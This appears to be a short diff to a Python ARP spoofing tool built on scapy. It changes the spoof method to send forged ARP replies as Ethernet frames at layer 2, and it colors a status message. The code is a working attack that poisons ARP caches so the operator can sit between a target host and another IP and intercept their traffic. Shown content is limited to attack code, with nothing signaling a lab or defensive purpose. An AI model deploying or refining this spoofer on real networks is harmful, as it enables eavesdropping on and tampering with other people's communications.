@@ -35,13 +35,15 @@ class ArpSpoofing:
         return answered_list[0][1].hwsrc if answered_list else None
 
     def spoof(self, target_ip, target_mac, spoof_ip):
-        packet = scapy.ARP(
+        ether = scapy.Ether(dst=target_mac)
+        arp = scapy.ARP(
             op=2,
             pdst=target_ip,
             hwdst=target_mac,
             psrc=spoof_ip,
         )
-        scapy.send(packet, verbose=False, iface=self.interface)
+        packet = ether / arp
+        scapy.sendp(packet, verbose=False, iface=self.interface)
 
     def restore(self):
         print("\n[*] Restoring ARP tables...")
@@ -80,7 +82,7 @@ class ArpSpoofing:
 
     def run(self):
         print(
-            f"[*] Starting ARP spoofing between {self.target_ip} and {self.spoof_ip}..."
+            f"\033[31m[*] \033[0m Starting ARP spoofing between {self.target_ip} and {self.spoof_ip}..."
         )
         try:
             while self.running:
